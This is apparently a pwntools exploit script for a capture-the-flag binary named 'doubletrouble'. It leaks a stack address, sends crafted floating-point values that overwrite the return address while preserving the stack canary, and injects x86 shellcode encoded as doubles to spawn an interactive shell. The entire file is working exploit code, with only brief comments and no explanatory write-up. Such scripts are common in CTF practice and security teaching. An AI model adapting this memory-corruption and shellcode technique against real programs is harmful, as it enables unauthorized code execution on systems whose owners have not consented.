from pwn import *
import struct

target = process('./doubletrouble')
# gdb.attach(target, gdbscript='b *0x08049732')

# get stack address
stack = target.recvline().rstrip()
stack = int(stack, 16)
shellcode_addr = stack + 0x1d8

# define the return address
ret_addr = "0x8049010" + hex(shellcode_addr).replace('0x', '')
ret_addr = int(ret_addr, 16)

# shellcode
'''
0x9101eb51e1f7c931 -> -9.455235083177544e-227
0x90909068732f2f68 -> -6.8282747051424842e-229
0x9090406e69622f68 -> -6.6994892300412978e-229
0x900080cd0bb0e389 -> -1.3287388429188698e-231
'''
s1 = '-9.455235083177544e-227'
s2 = '-6.8282747051424842e-229'
s3 = '-6.6994892300412978e-229'
s4 = '-1.3287388429188698e-231'

# send data length
target.recvuntil('How long: ')
target.sendline('64')

# send small values (filler) -> tot 5
for i in range(5):
    target.sendline('-1.5846380065386629e+306') #0xff820d8400000000

# send bug triggering value -> tot 6
target.sendline('-23')

# send rest of filler -> tot 57
for i in range(51):
    target.sendline('-1.5846380065386629e+306') #0xff820d8400000000

# send filler between canary and shellcode -> tot 58
target.sendline('3.7857669957336791e-270') # 0x0800000000000000

# send shellcode -> tot 62
target.sendline(s1)
target.sendline(s2)
target.sendline(s3)
target.sendline(s4)

# send the address of the shellcode -> tot 63
target.sendline('%.19g' % struct.unpack('<d', p64(ret_addr)))

# send 'does nothing' gadget -> tot 64
target.sendline('4.8653382194983783e-270') # 0x0804900a00000000

target.interactive()